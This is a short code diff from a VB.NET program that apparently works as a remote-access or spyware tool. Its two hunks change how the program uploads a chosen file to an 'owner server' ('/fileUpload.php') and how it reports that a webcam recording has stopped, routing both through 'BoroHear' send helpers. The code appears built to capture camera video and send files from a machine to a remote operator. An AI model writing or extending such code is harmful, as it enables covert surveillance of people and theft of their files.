@@ -34,7 +34,7 @@ Public Class Main
         Try
             If filePath.ToLower = "null" Or filePath = Nothing Then
             Else
-                My.Computer.Network.UploadFile(filePath, HttpOwnerServer & "/fileUpload.php")
+                BoroHearSendFile(filePath)
                 End
             End If
         Catch ex As Exception
@@ -146,7 +146,7 @@ Public Class Main
                 isWebCamRecording = False
                 'VideoWriter.Close()
             End If
-            BoroHearInterop("Camera video record stopped! Written in " & IO.Path.GetFileName(videoFilePath))
+            BoroHearSendContent("Camera video record stopped! Written in " & IO.Path.GetFileName(videoFilePath))
             Return videoFilePath
         Catch ex As Exception
             AddToLog("StopCamRecord@Main", "Error: " & ex.Message, True)
